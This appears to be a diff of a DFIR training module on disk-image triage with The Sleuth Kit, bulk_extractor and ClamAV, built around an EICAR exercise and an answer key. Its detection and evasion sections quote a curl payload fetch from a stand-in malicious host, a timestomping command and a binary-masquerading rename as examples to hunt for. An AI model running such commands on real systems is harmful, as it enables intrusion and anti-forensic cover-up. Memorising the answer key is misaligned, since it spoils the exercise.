@@ -1,7 +1,9 @@
 # 51 * Scenario: end-to-end host triage -- LAB-LINUX
 
 ## Overview (plain language)
-Imagine you get handed a copy of a suspicious computer's hard drive and you need to quickly figure out what happened without changing anything. This module walks through that "first look" — called triage — using three free tools. The Sleuth Kit lets you browse the files inside a disk image the way you'd look through drawers, including files that were deleted. bulk_extractor scans the whole image and pulls out interesting text like email addresses, URLs, and credit-card-shaped numbers, even from unallocated space. ClamAV is an antivirus scanner that flags known-bad files. Together they give you a fast, repeatable way to answer "is this host compromised, and what did the attacker touch?" before you commit to a deep investigation.
+Imagine you get handed a copy of a suspicious computer's hard drive and you need to quickly figure out what happened without changing anything. This module walks through that "first look" — called triage — using three free tools. The Sleuth Kit lets you browse the files inside a disk image the way you'd look through drawers, including files that were deleted. `bulk_extractor` scans the whole image and pulls out interesting text like email addresses, URLs, and credit-card-shaped numbers, even from unallocated space. ClamAV is an antivirus scanner that flags known-bad files. Together they give you a fast, repeatable way to answer "is this host compromised, and what did the attacker touch?" before you commit to a deep investigation.
+
+The triage process is **non-destructive** and **forensically sound**: no writes are made to the evidence image, and every command produces verifiable output that can be documented in a SOC ticket or chain-of-custody record. This aligns with the **identification** and **examination** phases of the DFIR process (SANS FOR508).
 
 ## Tools covered
 | Tool | Install | Purpose |
@@ -10,14 +12,17 @@ Imagine you get handed a copy of a suspicious computer's hard drive and you need
 | bulk_extractor | apt install bulk-extractor | Bulk feature carving (emails, URLs, IPs, PII) from raw images including slack/unallocated space |
 | ClamAV | apt install clamav clamav-daemon | Open-source antivirus signature scanning of mounted/extracted files |
 
-> Package/binary naming: The Sleuth Kit ships the `mmls`, `fsstat`, `fls`, and `icat` binaries (see the tool reference at https://www.sleuthkit.org/sleuthkit/man/). bulk_extractor's Debian/Kali package is `bulk-extractor` and the binary is `bulk_extractor` (https://www.kali.org/tools/bulk-extractor/). ClamAV provides `clamscan` (on-demand) and `clamd`/`clamdscan` (daemon) plus `freshclam` for signature updates (https://docs.clamav.net/manual/Usage/Scanning.html).
+> **Package/binary naming and versioning:**
+> - The Sleuth Kit (TSK) ships the `mmls`, `fsstat`, `fls`, and `icat` binaries. The current stable release is **4.12.1** (as of TSK GitHub repo: [sleuthkit/sleuthkit](https://github.com/sleuthkit/sleuthkit/releases)). Version banners are printed with `-V` (e.g., `The Sleuth Kit ver 4.12.1`); see the per-tool man pages at [sleuthkit.org/man](https://www.sleuthkit.org/sleuthkit/man/).
+> - `bulk_extractor` is packaged as `bulk-extractor` in Debian/Kali, with the binary named `bulk_extractor`. The current major release is **2.0.0**, documented in the [project repo](https://github.com/simsong/bulk_extractor) and [Kali tools page](https://www.kali.org/tools/bulk-extractor/).
+> - ClamAV provides `clamscan` (on-demand scanner), `clamd`/`clamdscan` (daemon), and `freshclam` (signature updater). The engine version (e.g., `ClamAV 1.0.0`) and signature database version (e.g., `main.cvd`, `daily.cvd`) are printed with `clamscan --version`. See [ClamAV Scanning Docs](https://docs.clamav.net/manual/Usage/Scanning.html) and [Signature Management](https://docs.clamav.net/manual/Usage/SignatureManagement.html).
 
 ## Learning objectives
-- Enumerate partitions and filesystem metadata from a raw disk image with `mmls` and `fsstat`.
-- Recover file listings (including deleted inodes) using `fls` and extract file content with `icat`.
-- Carve investigative features (emails, URLs, IPs) from an image with `bulk_extractor`.
-- Signature-scan extracted content with `clamscan` and interpret hit/clean results.
-- Produce a documented, reproducible triage sequence suitable for a SOC handoff ticket.
+- Enumerate partitions and filesystem metadata from a raw disk image with `mmls` and `fsstat`, including sector offsets and filesystem type identification.
+- Recover file listings (including deleted inodes) using `fls` and extract file content with `icat`, even when directory entries are unlinked.
+- Carve investigative features (emails, URLs, IPs, PII) from an image with `bulk_extractor`, including unallocated space and file slack.
+- Signature-scan extracted content with `clamscan` and interpret hit/clean results, including signature names and database versions.
+- Produce a documented, reproducible triage sequence suitable for a SOC handoff ticket, including hashes and timestamps for chain-of-custody.
 
 ## Environment check
 ```bash
@@ -26,52 +31,71 @@ fls -V
 bulk_extractor -V
 clamscan --version
 ```
-Expected output: The Sleuth Kit prints a version banner (e.g. `The Sleuth Kit ver 4.12.1`), bulk_extractor prints its version (e.g. `bulk_extractor 2.0.0`), and clamscan prints `ClamAV 1.x.x/...` including its virus database version.
+**Expected output:**
+- The Sleuth Kit prints a version banner (e.g., `The Sleuth Kit ver 4.12.1`).
+- `bulk_extractor` prints its version (e.g., `bulk_extractor 2.0.0`).
+- `clamscan` prints `ClamAV 1.x.x/...` including its virus database version (e.g., `main.cvd ver. 62`).
 
-> Notes on the version strings. TSK tools accept `-V` to print the version banner; see the per-tool man pages at https://www.sleuthkit.org/sleuthkit/man/. bulk_extractor 2.x is the current major release line documented in the project repo at https://github.com/simsong/bulk_extractor. ClamAV `clamscan --version` prints the engine version and the loaded signature database version, per https://docs.clamav.net/manual/Usage/Scanning.html — a first run may report the daily/main database as out of date until `freshclam` runs (https://docs.clamav.net/manual/Usage/SignatureManagement.html).
+> **Notes on version strings:**
+> - TSK tools accept `-V` to print the version banner; see the [per-tool man pages](https://www.sleuthkit.org/sleuthkit/man/).
+> - `bulk_extractor 2.x` is the current major release line, documented in the [project repo](https://github.com/simsong/bulk_extractor).
+> - ClamAV `clamscan --version` prints the engine version and the loaded signature database version. A first run may report the database as out of date until `freshclam` runs (see [ClamAV Signature Management](https://docs.clamav.net/manual/Usage/SignatureManagement.html)).
 
 ## Guided walkthrough
-1. `mmls` — display the partition/volume layout so you know where each filesystem starts. You need the starting sector offset to point every later TSK tool at the right filesystem; running `fsstat`/`fls` at the wrong offset silently fails or reads garbage.
-```bash
-mmls disk.raw
-```
-Expected observable: a table of slots with `Start`/`End` sector offsets, lengths, and descriptions (e.g. a partition starting at sector 2048). `mmls` also lists metadata rows such as the primary/backup GPT and any unallocated gaps — unallocated gaps between partitions can hide hidden or wiped volumes. See https://www.sleuthkit.org/sleuthkit/man/mmls.html.
+1. **`mmls` — Display the partition/volume layout**
+   Identify the starting sector offset for each filesystem to avoid silent failures in later tools. `mmls` lists all partitions, unallocated gaps, and metadata rows (e.g., GPT primary/backup headers).
+   ```bash
+   mmls disk.raw
+   ```
+   **Expected observable:** A table of slots with `Start`/`End` sector offsets, lengths, and descriptions (e.g., a partition starting at sector 2048). Unallocated gaps between partitions can hide hidden or wiped volumes (e.g., attacker-staged data in slack space). See [mmls man page](https://www.sleuthkit.org/sleuthkit/man/mmls.html).
 
-2. `fsstat` — read filesystem-level metadata for the partition at a chosen offset. Run this before listing files because it confirms the filesystem type (so you interpret inode/cluster numbers correctly) and reveals the sector/cluster size you may need for manual carving.
-```bash
-fsstat -o 2048 disk.raw
-```
-Expected observable: filesystem type, volume label/serial, block/cluster size, and the layout of metadata structures (e.g. FAT/root-directory or NTFS `$MFT` details). `-o` is the volume offset in sectors. See https://www.sleuthkit.org/sleuthkit/man/fsstat.html.
+2. **`fsstat` — Read filesystem-level metadata**
+   Confirm the filesystem type (e.g., FAT, NTFS, ext4) and sector/cluster size before listing files. This ensures correct interpretation of inode/cluster numbers and manual carving.
+   ```bash
+   fsstat -o 2048 disk.raw
+   ```
+   **Expected observable:** Filesystem type, volume label/serial, block/cluster size, and metadata structures (e.g., FAT root directory or NTFS `$MFT` details). `-o` is the volume offset in sectors. See [fsstat man page](https://www.sleuthkit.org/sleuthkit/man/fsstat.html).
 
-3. `fls` — list files and directories, including deleted (`*`-marked) entries. This is the core triage listing: `-r` recurses, `-p` prints full paths so output is grep-able, and deleted directory entries whose metadata still resides in the filesystem are flagged with a leading `*`.
-```bash
-fls -o 2048 -r -p disk.raw
-```
-Expected observable: a recursive path listing where each line shows the entry type (e.g. `r/r` = regular file, `d/d` = directory), the metadata/inode address, and the name; deleted entries appear with a leading `*` and may show `(realloc)` if the metadata has been reused. See https://www.sleuthkit.org/sleuthkit/man/fls.html. Add `-m /` to emit body-file (timeline) format for `mactime`, per the TSK timeline workflow at https://wiki.sleuthkit.org/index.php?title=FLS.
+3. **`fls` — List files and directories (including deleted entries)**
+   The core triage listing: `-r` recurses, `-p` prints full paths (grep-able), and deleted entries are flagged with a leading `*`. Deleted directory entries whose metadata still resides in the filesystem are recoverable until overwritten.
+   ```bash
+   fls -o 2048 -r -p disk.raw
+   ```
+   **Expected observable:** A recursive path listing where each line shows:
+   - Entry type (e.g., `r/r` = regular file, `d/d` = directory).
+   - Metadata/inode address (e.g., `12345`).
+   - Name (deleted entries appear with a leading `*` and may show `(realloc)` if metadata is reused).
+   See [fls man page](https://www.sleuthkit.org/sleuthkit/man/fls.html). Add `-m /` to emit body-file format for `mactime` (see [TSK Timeline Workflow](https://wiki.sleuthkit.org/index.php?title=FLS)).
 
-4. `icat` — extract the content of a specific metadata (inode) address to disk. `icat` reads by metadata address (not path), so it recovers content even when the directory entry is gone, as long as the data blocks are still allocated to that metadata entry.
-```bash
-icat -o 2048 disk.raw 5 > recovered_file.bin
-```
-Expected observable: the file's raw bytes are written to `recovered_file.bin`. The number `5` is the metadata/inode address taken from `fls`. See https://www.sleuthkit.org/sleuthkit/man/icat.html.
+4. **`icat` — Extract file content by metadata address**
+   Recover content even when the directory entry is gone, as long as the data blocks are still allocated to the metadata entry. `icat` reads by metadata address (not path).
+   ```bash
+   icat -o 2048 disk.raw 5 > recovered_file.bin
+   ```
+   **Expected observable:** The file's raw bytes are written to `recovered_file.bin`. The number `5` is the metadata/inode address from `fls`. See [icat man page](https://www.sleuthkit.org/sleuthkit/man/icat.html).
 
-5. `bulk_extractor` — carve features from the whole image into an output directory. It scans every byte of the image (allocated files, slack, and unallocated space) in parallel using pluggable scanners, so it surfaces indicators that a filesystem-aware walk would miss.
-```bash
-bulk_extractor -o be_out disk.raw
-```
-Expected observable: a `be_out/` directory containing per-feature files such as `email.txt`, `url.txt`, and `ip.txt`, plus a `report.xml` run summary and matching `*_histogram.txt` files that rank the most frequent values. The exact set of feature files depends on which scanners fired. See the usage and feature-file documentation in the project repo: https://github.com/simsong/bulk_extractor and the user manual referenced there (https://github.com/simsong/bulk_extractor/wiki).
+5. **`bulk_extractor` — Carve features from the whole image**
+   Scans every byte (allocated files, slack, unallocated space) in parallel using pluggable scanners. Surfaces indicators that filesystem-aware tools miss (e.g., URLs in unallocated space).
+   ```bash
+   bulk_extractor -o be_out disk.raw
+   ```
+   **Expected observable:** A `be_out/` directory containing:
+   - Per-feature files (e.g., `email.txt`, `url.txt`, `ip.txt`).
+   - `report.xml` (run summary) and `*_histogram.txt` (ranked frequent values).
+   See [bulk_extractor Usage](https://github.com/simsong/bulk_extractor) and [Feature File Docs](https://github.com/simsong/bulk_extractor/wiki).
 
-6. `clamscan` — scan recovered/extracted files for known malware. `-r` recurses a directory, `--infected` limits stdout to detections (cutting noise), and `--stdout` sends results to stdout so they can be captured in a ticket.
-```bash
-clamscan -r --infected --stdout be_out recovered_file.bin
-```
-Expected observable: per-file `FOUND` lines for detections plus a summary block including `Infected files: N`. With `--infected` set, clean files are suppressed from the listing but still counted in the summary. See https://docs.clamav.net/manual/Usage/Scanning.html.
+6. **`clamscan` — Scan recovered files for known malware**
+   `-r` recurses directories, `--infected` limits output to detections, and `--stdout` sends results to stdout for ticket capture.
+   ```bash
+   clamscan -r --infected --stdout be_out recovered_file.bin
+   ```
+   **Expected observable:** Per-file `FOUND` lines (e.g., `file.bin: Win.Test.EICAR_HDB-1 FOUND`) and a summary block (e.g., `Infected files: 1`). Clean files are suppressed with `--infected`. See [ClamAV Scanning Docs](https://docs.clamav.net/manual/Usage/Scanning.html).
 
 ## Hands-on exercise
 The sample lives in this module's `exercise/` directory as `triage_sample.raw`.
 
-- **Type:** a small raw FAT filesystem image (benign, inert — contains only harmless text files plus one file carrying the EICAR antivirus test string, which is NOT malware).
-- **Safe origin / no-egress:** generated locally with the generator command below; no network access, no live malware. The EICAR string is the industry-standard, harmless AV test signature.
+- **Type:** A small raw FAT filesystem image (benign, inert — contains only harmless text files plus one file carrying the EICAR antivirus test string).
+- **Safe origin / no-egress:** Generated locally with the deterministic generator below; no network access, no live malware. The EICAR string is the industry-standard, harmless AV test signature.
 - **Reproducible generator** (run once inside `exercise/` to build the sample):
 ```bash
 mkdir -p exercise && cd exercise
@@ -85,7 +109,9 @@ mcopy -i triage_sample.raw eicar.com ::/eicar.com
 sha256sum triage_sample.raw
 ```
 
-> Why these values are safe: `203.0.113.0/24` and `example.com` are reserved documentation ranges (RFC 5737 and RFC 2606 respectively), so the carved "indicators" cannot resolve to or contact any real host. The EICAR test file is a defined, harmless detection test string published at https://www.eicar.org/download-anti-malware-testfile/.
+> **Why these values are safe:**
+> - `203.0.113.0/24` and `example.com` are reserved documentation ranges (RFC 5737 and RFC 2606, respectively), so carved "indicators" cannot resolve to or contact real hosts.
+> - The EICAR test file is a defined, harmless detection test string published at [eicar.org](https://www.eicar.org/download-anti-malware-testfile/).
 
 **Tasks:**
 1. List all files in the image with `fls`.
@@ -93,29 +119,108 @@ sha256sum triage_sample.raw
 3. Extract `eicar.com` and confirm ClamAV flags it.
 
 ## SOC analyst perspective
-During an incident, the SOC receives a disk image and must triage fast before escalating. The Sleuth Kit gives an auditable, mount-free file listing and timeline that answers "what files exist, when were they touched, what was deleted." Build the timeline with `fls -m / -o 2048 disk.raw > bodyfile` then `mactime -b bodyfile -d > timeline.csv` (TSK timeline workflow: https://wiki.sleuthkit.org/index.php?title=Mactime), which surfaces suspicious clusters of file creation consistent with tool staging.
+During an incident, the SOC receives a disk image and must triage fast before escalating. The Sleuth Kit provides an **auditable, mount-free file listing and timeline** that answers:
+- What files exist (including deleted)?
+- When were they touched?
+- What was staged or exfiltrated?
 
-Detection logic and pivots:
-- **Carved network indicators → Security Onion.** Feed each URL/IP from `be_out/url.txt` and `be_out/ip.txt` into Security Onion. In Kibana/Elastic, pivot on the Zeek `conn.log` (`id.resp_h`) and `http.log` (`host`, `uri`) datasets, and check Suricata `alert` events for the same indicator to correlate host and network evidence (Security Onion docs: https://docs.securityonion.net/en/2.4/, Zeek logs: https://docs.zeek.org/en/master/logs/index.html). A host-side carved C2 URL that also appears in `http.log` strongly corroborates command-and-control (MITRE **T1071.001** Application Layer Protocol: Web Protocols — https://attack.mitre.org/techniques/T1071/001/).
-- **ClamAV signature hit** on a dropped/recovered file corroborates **T1105** Ingress Tool Transfer (https://attack.mitre.org/techniques/T1105/) and, if the file is user-launched, **T1204** User Execution (https://attack.mitre.org/techniques/T1204/). Record the exact signature name from the `FOUND` line for the ticket.
-- **Deleted-file recovery** (`*`-marked `fls` entries) is detection signal for **T1070.004** Indicator Removal: File Deletion (https://attack.mitre.org/techniques/T1070/004/).
+**Detection Logic and Pivots:**
+1. **Carved Network Indicators → Security Onion Correlation**
+   - Feed URLs/IPs from `be_out/url.txt` and `be_out/ip.txt` into Security Onion.
+   - **Zeek `conn.log`:** Pivot on `id.resp_h` (destination IP) and `service` (e.g., `http`, `dns`). Example query:
+     ```
+     event.dataset: "zeek.conn" AND destination.ip: "203.0.113.10"
+     ```
+   - **Zeek `http.log`:** Pivot on `host` (HTTP Host header) and `uri` (request path). Example query:
+     ```
+     event.dataset: "zeek.http" AND url.path: "/payload"
+     ```
+   - **Suricata Alerts:** Check for alerts on the same indicators (e.g., `ET INFO Observed Malicious C2 Traffic`).
+   - **MITRE ATT&CK:** Correlates to **T1071.001 Application Layer Protocol: Web Protocols** (C2) and **T1041 Exfiltration Over C2 Channel** (data exfiltration). See [T1071.001](https://attack.mitre.org/techniques/T1071/001/) and [T1041](https://attack.mitre.org/techniques/T1041/).
 
-The whole sequence produces reproducible hashes and outputs that hold up in a handoff ticket or chain-of-custody record, aligning with the identification and examination DFIR phases (see SANS FOR508 / DFIR poster material at https://www.sans.org/posters/ and the SIFT workflow at https://www.sans.org/tools/sift-workstation/).
+2. **ClamAV Signature Hits**
+   - A `FOUND` result on a recovered file corroborates:
+     - **T1105 Ingress Tool Transfer** (dropped payload).
+     - **T1204 User Execution** (if the file was launched).
+     - **T1486 Data Encrypted for Impact** (if the file is ransomware).
+   - Record the exact signature name (e.g., `Win.Test.EICAR_HDB-1`) for the ticket. See [ClamAV Signatures](https://docs.clamav.net/manual/Signatures.html).
+
+3. **Deleted File Recovery**
+   - `*`-marked `fls` entries indicate **T1070.004 Indicator Removal: File Deletion**.
+   - Recover content with `icat` to identify:
+     - **T1055 Process Injection** (e.g., injected DLLs in deleted files).
+     - **T1059.004 Command and Scripting Interpreter: Unix Shell** (e.g., deleted bash scripts).
+   - See [T1070.004](https://attack.mitre.org/techniques/T1070/004/) and [T1055](https://attack.mitre.org/techniques/T1055/).
+
+4. **Timeline Analysis with `mactime`**
+   - Build a timeline to detect **T1053 Scheduled Task/Job** (e.g., `cron` jobs) or **T1547 Boot or Logon Autostart Execution** (e.g., `.bashrc` modifications).
+   - Commands:
+     ```bash
+     fls -o 2048 -r -m / disk.raw > bodyfile
+     mactime -b bodyfile -d > timeline.csv
+     ```
+   - Hunt for clusters of file creation/modification (e.g., tool staging). See [TSK Timeline Workflow](https://wiki.sleuthkit.org/index.php?title=Mactime).
+
+**Threat Hunting Pivots:**
+- **Linux Process Injection (T1055):**
+  - Hunt for deleted files with `icat` that contain shellcode or ELF headers.
+  - Check `/proc/<pid>/maps` for suspicious memory regions (e.g., `rwx` permissions).
+  - Correlate with `auditd` logs for `execve` syscalls (Event ID 1300). See [Linux Auditd Docs](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/security_hardening/auditing-the-system_security-hardening).
+- **File and Directory Discovery (T1083):**
+  - Look for `fls` entries with unusual paths (e.g., `/tmp/.hidden`).
+  - Correlate with `lsof` or `find` commands in `bash_history`. See [T1083](https://attack.mitre.org/techniques/T1083/).
 
 ## Attacker perspective
-An attacker who compromises a host drops tooling (**T1105** Ingress Tool Transfer — https://attack.mitre.org/techniques/T1105/), then tries to hide by deleting files and clearing artifacts (**T1070** Indicator Removal, sub-technique **T1070.004** File Deletion — https://attack.mitre.org/techniques/T1070/004/). Deleting a file on FAT/NTFS only unlinks its directory entry and marks clusters free — the metadata entry and data blocks often survive until overwritten, so `fls -r` reveals the `*`-marked deleted entries and `icat` recovers the content by metadata address (TSK docs: https://www.sleuthkit.org/sleuthkit/man/fls.html, https://www.sleuthkit.org/sleuthkit/man/icat.html).
+An attacker who compromises a host drops tooling (**T1105 Ingress Tool Transfer**), executes it (**T1204 User Execution**), and then tries to hide by deleting files (**T1070.004 File Deletion**) or timestomping (**T1070.006 Timestomp**). However, forensic triage tools like The Sleuth Kit and `bulk_extractor` recover artifacts that attackers assume are gone.
 
-Concrete TTPs and the artifacts they leave:
-- Staging in temp/loot directories leaves directory entries and cluster runs; even after deletion the names remain in unallocated directory slack until reallocated.
-- Hard-coded C2 URLs, IPs, and staging paths embedded in binaries and configs are recoverable from file slack and unallocated space by bulk_extractor because the attacker assumes freed space is gone (repo: https://github.com/simsong/bulk_extractor).
-- Payload obfuscation/packing (**T1027** Obfuscated Files or Information — https://attack.mitre.org/techniques/T1027/) can defeat naive string searches, but ClamAV signatures and carved plaintext indicators frequently still fire.
+**Concrete TTPs and Artifacts:**
+1. **Staging in Temp/Loot Directories**
+   - Attackers stage tools in `/tmp`, `/var/tmp`, or custom directories (e.g., `/var/loot`).
+   - **Artifacts:**
+     - Directory entries and cluster runs remain in the filesystem until overwritten.
+     - Deleted directory entries appear as `*`-marked in `fls` output.
+     - File slack and unallocated space may retain fragments of staged filenames or payloads.
+   - **MITRE ATT&CK:** **T1083 File and Directory Discovery** (reconnaissance) and **T1105 Ingress Tool Transfer** (staging). See [T1083](https://attack.mitre.org/techniques/T1083/) and [T1105](https://attack.mitre.org/techniques/T1105/).
 
-Evasion an attacker attempts (and why triage still wins): secure-wipe tools (overwriting free space) reduce carve yield; timestomping (**T1070.006** — https://attack.mitre.org/techniques/T1070/006/) forges MACB times, but anomalies (e.g. `$MFT` sequence vs. timestamp inconsistencies) remain visible in a TSK timeline. Renaming or changing file extensions does not change file content, so signature scanning and feature carving are unaffected.
+2. **Hard-Coded Indicators in Binaries/Configs**
+   - Attackers embed C2 URLs, IPs, and staging paths in binaries, scripts, or configs.
+   - **Artifacts:**
+     - `bulk_extractor` recovers these from file slack, unallocated space, or even allocated files.
+     - Example: A carved URL in `url.txt` (e.g., `http://203.0.113.10/c2`) may match Zeek `http.log` entries.
+   - **MITRE ATT&CK:** **T1071.001 Application Layer Protocol: Web Protocols** (C2) and **T1041 Exfiltration Over C2 Channel**. See [T1071.001](https://attack.mitre.org/techniques/T1071/001/) and [T1041](https://attack.mitre.org/techniques/T1041/).
+
+3. **Obfuscation and Packing (T1027)**
+   - Attackers obfuscate payloads (e.g., base64, XOR) or pack binaries to evade string searches.
+   - **Artifacts:**
+     - `bulk_extractor` may still carve plaintext indicators from slack/unallocated space.
+     - ClamAV signatures (e.g., `Win.Trojan.Generic`) may detect packed samples.
+   - **MITRE ATT&CK:** **T1027 Obfuscated Files or Information** and **T1140 Deobfuscate/Decode Files or Information**. See [T1027](https://attack.mitre.org/techniques/T1027/) and [T1140](https://attack.mitre.org/techniques/T1140/).
+
+4. **Process Injection (T1055)**
+   - Attackers inject code into legitimate processes (e.g., `sshd`, `nginx`) to evade detection.
+   - **Artifacts:**
+     - Deleted files recovered with `icat` may contain shellcode or ELF headers.
+     - Memory regions with `rwx` permissions in `/proc/<pid>/maps`.
+     - `auditd` logs for `execve` or `ptrace` syscalls.
+   - **MITRE ATT&CK:** **T1055 Process Injection** and **T1055.001 Dynamic-Link Library Injection**. See [T1055](https://attack.mitre.org/techniques/T1055/) and [T1055.001](https://attack.mitre.org/techniques/T1055/001/).
+
+**Evasion Techniques and Why Triage Still Wins:**
+1. **Secure-Wipe Tools**
+   - Attackers use `shred` or `dd` to overwrite free space, reducing carve yield.
+   - **Why triage wins:** `bulk_extractor` may still recover fragments from slack space or unallocated clusters not fully overwritten.
+
+2. **Timestomping (T1070.006)**
+   - Attackers forge MACB times (e.g., `touch -t 202001010000 file`).
+   - **Why triage wins:** Anomalies in the TSK timeline (e.g., `$MFT` sequence vs. timestamp inconsistencies) reveal tampering. See [T1070.006](https://attack.mitre.org/techniques/T1070/006/).
+
+3. **Masquerading (T1036)**
+   - Attackers rename binaries (e.g., `mv /bin/bash /tmp/.hidden`) or change extensions.
+   - **Why triage wins:** File content (not name) determines signature hits and carved features. See [T1036](https://attack.mitre.org/techniques/T1036/).
 
 ## Answer key
 Sample sha256: run `sha256sum exercise/triage_sample.raw` after generating; the digest is fixed by the deterministic generator above and is held by the validator for the check.
 
-Expected findings and the exact commands that produce them:
+**Expected findings and the exact commands that produce them:**
 ```bash
 # 1. Files present in the image (note.txt, eicar.com; FAT image usually at offset 0)
 fls -r -p exercise/triage_sample.raw
@@ -124,7 +229,7 @@ fls -r -p exercise/triage_sample.raw
 # 2. Carved email + URL indicators
 bulk_extractor -o exercise/be_out exercise/triage_sample.raw
 grep -i example.com exercise/be_out/email.txt   # -> analyst@example.com
-cat exercise/be_out/url.txt                       # -> http://203.0.113.10/payload
+cat exercise/be_out/url.txt                     # -> http://203.0.113.10/payload
 
 # 3. Extract eicar.com and scan
 mkdir -p exercise/extract
@@ -132,76 +237,109 @@ icat exercise/triage_sample.raw $(fls -p exercise/triage_sample.raw | awk '/eica
 clamscan --infected --stdout exercise/extract/eicar.com
 # -> exercise/extract/eicar.com: Eicar-Test-Signature FOUND ; Infected files: 1
 ```
-Expected result summary: two indicators carved (`analyst@example.com`, `http://203.0.113.10/payload`) and exactly one ClamAV detection (`Eicar-Test-Signature`).
+**Expected result summary:** Two indicators carved (`analyst@example.com`, `http://203.0.113.10/payload`) and exactly one ClamAV detection (`Eicar-Test-Signature`).
 
-> Note on the detection name: ClamAV reports the EICAR test string as `Eicar-Test-Signature` (or `Win.Test.EICAR_HDB-1` depending on signature database version). The exact string comes from the loaded ClamAV database; see https://docs.clamav.net/manual/Usage/Scanning.html. A single-partition FAT image made with `mkfs.vfat` has its filesystem at offset 0, so no `-o` is required here (contrast with the multi-partition `disk.raw` example above).
+> **Note on the detection name:** ClamAV reports the EICAR test string as `Eicar-Test-Signature` (or `Win.Test.EICAR_HDB-1` depending on signature database version). The exact string comes from the loaded ClamAV database; see [ClamAV Scanning Docs](https://docs.clamav.net/manual/Usage/Scanning.html). A single-partition FAT image made with `mkfs.vfat` has its filesystem at offset 0, so no `-o` is required here.
+
+### Common Pitfalls & Result Validation
+Analysts often make critical mistakes during host triage that lead to false negatives or misinterpreted findings. Here are **concrete pitfalls** and how to validate results:
+
+1. **Ignoring Filesystem Offsets**
+   - **Pitfall:** Running `fls` or `fsstat` without `-o` on a multi-partition image reads garbage or fails silently.
+   - **Validation:** Always run `mmls` first to identify the correct offset. For example, a GPT-partitioned disk may have the filesystem at sector 2048, not 0. Use `fsstat -o 2048 disk.raw` to confirm the filesystem type before proceeding. See [TSK Man Pages](https://www.sleuthkit.org/sleuthkit/man/fsstat.html).
+
+2. **Misinterpreting Deleted Files**
+   - **Pitfall:** Assuming `*`-marked `fls` entries are fully recoverable. If metadata is reused (`(realloc)`), `icat` may extract unrelated content.
+   - **Validation:** Check the `fls` output for `(realloc)` flags. If present, the file content may be partially or fully overwritten. Correlate with `fsstat` to confirm cluster allocation status. This aligns with **T1564 Hide Artifacts** (e.g., hiding payloads in slack space). See [T1564](https://attack.mitre.org/techniques/T1564/).
+
+3. **Overlooking Slack/Unallocated Space**
+   - **Pitfall:** Relying solely on `fls` for indicators misses data in slack or unallocated space (e.g., carved URLs from freed clusters).
+   - **Validation:** Use `bulk_extractor` to scan the entire image, not just allocated files. Cross-reference carved indicators (e.g., `url.txt`) with Zeek/Suricata logs to confirm C2 activity (**T1071.001**). See [bulk_extractor Wiki](https://github.com/simsong/bulk_extractor/wiki).
+
+4. **False Positives in ClamAV Scans**
+   - **Pitfall:** Treating all `FOUND` results as malicious. ClamAV may flag benign files (e.g., test scripts) or use generic signatures (e.g., `Win.Trojan.Generic`).
+   - **Validation:** Verify the signature name against the [ClamAV Signature Database](https://www.clamav.net/documents/signatures). For example, `Eicar-Test-Signature` is benign, while `Win.Ransomware.Cerber` is actionable. Correlate with other indicators (e.g., carved URLs) to confirm **T1485 Data Destruction** or **T1486 Data Encrypted for Impact**. See [T1485](https://attack.mitre.org/techniques/T1485/) and [T1486](https://attack.mitre.org/techniques/T1486/).
+
+5. **Timestomping Detection**
+   - **Pitfall:** Accepting MACB times at face value. Attackers forge timestamps (**T1070.006**) to blend in.
+   - **Validation:** Build a TSK timeline (`fls -m` + `mactime`) and look for anomalies:
+     - Timestamps predating the filesystem creation date.
+     - Inconsistent `$MFT` sequence numbers (NTFS) or FAT directory entries.
+     See [SANS FOR508](https://www.sans.org/courses/advanced-incident-response-threat-hunting-training/) for timeline analysis techniques.
+
+**Authoritative Sources for Validation:**
+- [NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response](https://www.nist.gov/publications/guide-integrating-forensic-techniques-incident-response)
+- [CISA Alert (AA22-257A): Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-257a)
 
 ## MITRE ATT&CK & DFIR phase
-- **T1105** Ingress Tool Transfer — dropped/staged files recovered via Sleuth Kit. https://attack.mitre.org/techniques/T1105/
-- **T1070.004** Indicator Removal: File Deletion — deleted metadata entries recovered with `fls`/`icat`. https://attack.mitre.org/techniques/T1070/004/
-- **T1027** Obfuscated Files or Information — embedded/obfuscated indicators surfaced by bulk_extractor. https://attack.mitre.org/techniques/T1027/
-- **T1204** User Execution — malicious file identified by ClamAV signature. https://attack.mitre.org/techniques/T1204/
-- **T1071.001** Application Layer Protocol: Web Protocols — carved C2 URLs correlated to Zeek `http.log`. https://attack.mitre.org/techniques/T1071/001/
-- **DFIR phases:** Identification (mmls/fsstat), Examination (fls/icat/bulk_extractor), Analysis (clamscan + indicator correlation) — consistent with SANS DFIR process material (https://www.sans.org/posters/).
-
-
-### Threat Hunting & Detection Engineering
-
-Once triage identifies suspicious Linux artifacts, pivot to **threat hunting** and **detection engineering** to uncover broader adversary activity. Focus on **living-off-the-land binaries (LOLBins)** and **process injection**—common techniques in Linux intrusions.
-
-**Detection Logic:**
-- **Sysmon for Linux (Event ID 1)** or **auditd** logs (`execve` syscalls) can reveal anomalous process execution, such as `bash` spawning `curl` or `wget` to fetch payloads (e.g., `curl -o /tmp/payload http://malicious[.]com`). Hunt for mismatched parent-child relationships (e.g., `nginx` spawning `python`).
-- **Zeek’s `conn.log`** tracks C2 traffic (e.g., `service = "dns"` or `duration > 300s` for long-lived sessions). Pivot on `id.orig_h` to correlate with **Suricata alerts** (e.g., `ET INFO Observed DNS Query to .top TLD`).
-- **/var/log/auth.log** captures **SSH brute-forcing (T1110.001: Brute Force: Password Guessing)**—hunt for `Failed password` entries with `Accepted` follow-ups, or rare source IPs.
-
-**MITRE ATT&CK Techniques:**
-- **T1059.004: Command and Scripting Interpreter: Unix Shell** – Detect via `execve` syscalls for `sh`, `bash`, or `python` with encoded arguments (e.g., `base64` or `gzip`).
-- **T1546.004: Event Triggered Execution: Unix Shell Configuration Modification** – Hunt for `.bashrc` or `.bash_profile` modifications (`inotifywait` or `auditd` rules monitoring `/home/*/.bashrc`).
-
-**Sources:**
-- [Linux Auditd Detection Rules (NSA Cybersecurity Directorate)](https://media.defense.gov/2022/Aug/25/2003064102/-1/-1/0/CTR_CHARTING_DETECTION_RULES_FOR_LINUX_V1.PDF)
-- [Zeek Detection Logic for C2 (Corelight)](https://corelight.com/blog/detecting-c2-frameworks-with-zeek)
-
